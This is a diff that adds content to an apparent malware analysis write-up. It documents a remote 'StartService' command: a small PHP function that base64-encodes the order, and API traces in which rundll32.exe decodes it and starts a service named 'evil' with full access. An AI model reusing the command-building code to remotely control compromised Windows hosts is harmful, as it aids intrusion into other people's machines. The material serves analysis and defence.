@@ -676,19 +676,60 @@ function LoadManagedCode($filename)
 # StartService  
 
 ```php
-
+function StartService($MachineName, $ServiceName)
+{
+	$cmd_id = "\x56\x34 $MachineName $ServiceName";
+	$cmd_id_b64 = base64_encode($cmd_id);
+	
+	return $cmd_id_b64;
+}
 ```
 
 **I. Fetching the order**  
 
 ```html
-
+[CNT] [327]
+[PTP] [0x410] [0x81c] [c:\windows\system32\rundll32.exe]
+[API] <CryptStringToBinaryA> in [crypt32.dll] 
+[PAR] LPCTSTR pszString  : 0x000000C96B1E3C60
+[STR]         -> "vJ7S4O4DWydoZDlAiZKGGsy+QuHESPwfZxLiwC6kHD5hsnoJYG0KtuqZac7/JBB0"
+[PAR] DWORD   cchString  : 0x0
+[PAR] DWORD   dwFlags    : 0x1 (CRYPT_STRING_BASE64)
+[PAR] BYTE    *pbBinary  : 0x000000C96B1EED40
+[PAR] DWORD   *pcbBinary : 0x000000C96D09EB0C
+[PAR] DWORD   *pdwSkip   : 0x0
+[PAR] DWORD   *pdwFlags  : 0x0
+[RET] [0xc96cffbea1]
 ```
 
 **II. Execution**   
 
 ```html
+[CNT] [337]
+[PTP] [0x410] [0x81c] [c:\windows\system32\rundll32.exe]
+[API] <OpenSCManagerA> in [ADVAPI32.dll] 
+[PAR] LPCSTR  lpMachineName   : 0x0 (null)
+[PAR] LPCSTR  lpDatabaseName  : 0x000000C96D0188F4
+[STR]         -> "ServicesActive"
+[PAR] DWORD   dwDesiredAccess : 0xf003f (SC_MANAGER_ALL_ACCESS)
+[RET] [0xc96d00dcc5]
 
+[CNT] [338]
+[PTP] [0x410] [0x81c] [c:\windows\system32\rundll32.exe]
+[API] <OpenServiceW> in [ADVAPI32.dll] 
+[PAR] SC_HANDLE hSCManager      : 0x6b201bd0 
+[PAR] LPCWSTR   lpServiceName   : 0x000000C96B1F02D0
+[STR]           -> "evil"
+[PAR] DWORD     dwDesiredAccess : 0xf01ff (SERVICE_ALL_ACCESS)
+[RET] [0xc96d00dcf3]
+
+[CNT] [339]
+[PTP] [0x410] [0x81c] [c:\windows\system32\rundll32.exe]
+[API] <StartServiceA> in [ADVAPI32.dll] 
+[PAR] SC_HANDLE hService            : 0x000000C96B202140
+[PAR] DWORD     dwNumServiceArgs    : 0x0
+[PAR] LPCTSTR*  lpServiceArgVectors : 0x0
+[RET] [0xc96d00dd09]
 ```
 
 **III. Result**   
